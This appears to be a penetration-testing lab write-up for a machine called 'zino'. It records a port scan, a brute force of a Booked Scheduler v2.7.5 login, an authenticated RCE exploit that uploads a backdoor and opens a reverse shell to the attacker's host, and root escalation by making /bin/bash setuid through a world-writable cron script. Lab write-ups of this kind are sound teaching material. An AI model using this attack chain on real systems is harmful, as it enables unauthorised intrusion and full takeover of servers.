 
# Export
```md
export IP="192.168.156.64"
export URL="http://192.168.156.64:80/FUZZ"
```

<hr>

# RCE
+ Running CMS **Booked Scheduler v2.7.5** is vulnerable to Authenticated RCE.
+ PoC: [Exploit](https://github.com/jayngng/bookedScheduler_v2.7.5_RCE)

```bash
$ python3 booked_scheduler.py --url http://192.168.156.64:8003/booked/Web -u admin -p adminadmin -P 21 -H 192.168.49.156
[*] Checking host: http://192.168.156.64:8003/booked/Web
[+] Checking version Booked Scheduler v2.7.5: VULNERABLE !!!
[*] Checking credentials: admin:adminadmin
[+] Successfully logged in !.
[*] Grabing token: YjEzYzQ4NzIxMWZmMTU2MTU5N2NlMGM4NmI4MGJlMTE=
[*] Uploading backdoor shell...
[+] Trying to bind to :: on port 21: Done
[*] Triggering the shell ... 
[+] Waiting for connections on :::21: Got connection from ::ffff:192.168.156.64 on port 58506
[*] Switching to interactive mode
bash: cannot set terminal process group (561): Inappropriate ioctl for device
bash: no job control in this shell
www-data@zino:/var/www/html/booked/Web$ $
www-data@zino:/var/www/html/booked$ $ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<hr>

# Privilege Escalation
#### Local Enumeration
+ Crontab: the script `cleanup.py` runs every 3 minutes.
```bash
$ www-data@zino:/home/peter$ $ cat /etc/crontab
[...]
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```

+ The file `cleanup.py` is modificable by everyone:
```bash
www-data@zino:/home/peter$ $ ls -al /var/www/html/booked/cleanup.py
ls -al /var/www/html/booked/cleanup.py
-rwxrwxrwx 1 www-data www-data 164 Apr 28  2020 /var/www/html/booked/cleanup.py
```

```bash
www-data@zino:/var/www/html/booked$ $ echo "os.system('chmod +s /bin/bash')" >> /var/www/html/booked/cleanup.py
```

+ After three minutes
```bash
www-data@zino:/var/www/html/booked$ $ /bin/bash -p
/bin/bash -p
$ whoami
root
```

<hr>

# Credentials Panel
+ (Web 8003): `admin:adminadmin`

<hr>

# Nmap
```bash
$ sudo nmap --open -sV -A -p- -vv -n -Pn $IP

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC44YysvRUv+02vB7LK+DbEvDnTUU2Zzaj42pbyX7gL4I5DhhWWZmK4Sr/MulEE2XPnKhXCCwTVuA12C/VuFhVdnq7WjDwfV+4a1DEuDG8P7wQAux0waAsly34mGtd7HQhQIv9h7nQWcTx8hoOrF6D71eHiZmLJ6fk01VlFN75XKJGn/T/ClJHz9UJ33zwkhqXskMO9At21LfOBE+I3IQCHuFFO6DcQWw/SsZaXQxHNzLqnI/9j1aQuvyuh6KMdT6p10D577maBz+T+Hyq/qeOgbGU0YGAoXXMU36FibkoQ+WwDRYbEHYKJccUXhzFWp980PYCIDtZNaWuo/AbgryLB
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmcORNC6GjDnH1cqJrCeytZJjGrpJyY+CgseFsH27PJmSbmVYEz0ls0w/oXR0xrG/IfvxxyH9RRX2BIsBTx2cY=
|   256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9wfKL6wusRXGDMv5Tcf2OxMAIkhvOofRPsrSQ+aMbK
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql?      syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, NULL, RPCCheck, SSLSessionReq, WMSRequest, oracle-tns: 
|_    Host '192.168.49.156' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '192.168.49.156' is not allowed to connect to this MariaDB server
8003/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
```

<hr>

# Web Application
#### Port 8003
+ Running: **Booked Scheduler v2.7.5**. → Vulnerable version! → Authenticated RCE?
```bash
$ curl -s http://192.168.156.64:8003/booked/Web/index.php | html2text

 Toggle navigation     [Booked_Scheduler_-_Log_In]
    * Schedule
          o View_Schedule
          o View_Calendar
    * Help
          o Help
          o About
    * Log_In
[Booked Scheduler - Log In]
 [email               ]
   [********************]
Log In
⁰ Remember Me
[..]
Booked_Scheduler_v2.7.5
```

#### Brute force `admin` credentials
```bash
$ patator http_fuzz url=http://192.168.156.64:8003/booked/Web/index.php method=POST body='email=admin&password=FILE0&captcha=&login=submit&resume=&language=en_us' 0=/usr/share/seclists/Passwords/Common-Credentials/best1050.txt follow=1 -x ignore:fgrep='could not match'
02:54:48 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-15 02:54 EDT
02:54:48 patator    INFO -                                                                              
02:54:48 patator    INFO - code size:clen       time | candidate                          |   num | mesg
02:54:48 patator    INFO - -----------------------------------------------------------------------------
02:54:53 patator    INFO - 200  13017:-1       1.005 | adminadmin                         |   118 | HTTP/1.1 200 OK
02:55:23 patator    INFO - Hits/Done/Skip/Fail/Size: 1/1049/0/0/1049, Avg: 29 r/s, Time: 0h 0m 35s
```
